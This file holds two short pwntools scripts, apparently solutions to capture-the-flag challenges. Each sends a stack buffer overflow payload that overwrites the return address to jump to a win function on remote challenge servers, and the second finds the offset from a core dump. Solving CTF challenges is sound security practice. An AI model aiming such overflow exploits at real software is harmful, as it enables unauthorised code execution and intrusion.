#!/usr/bin/python3

from pwn import *

#p = process('./0_give_away')
p = remote('sharkyctf.xyz', 20333)

binary = ELF('./0_give_away')
win = binary.symbols['win_func']

payload  = 0x28 * b'A'
payload += p64(win)

p.sendline(payload)
p.interactive()

##best so far i have seen 
from pwn import *

p = process('./dangerous')

p.recvuntil('What\'s your name?')
p.sendline(cyclic(1024,n=8))
p.wait()
core = p.corefile
p.close()
os.remove(core.file.name)
padding = cyclic_find(core.read(core.rsp, 8),n=8)

payload  = padding * b'A'
payload += p64(0x40130e)

p = remote('jh2i.com', 50011)
p.recvuntil('What\'s your name?')
p.sendline(payload)
p.stream()



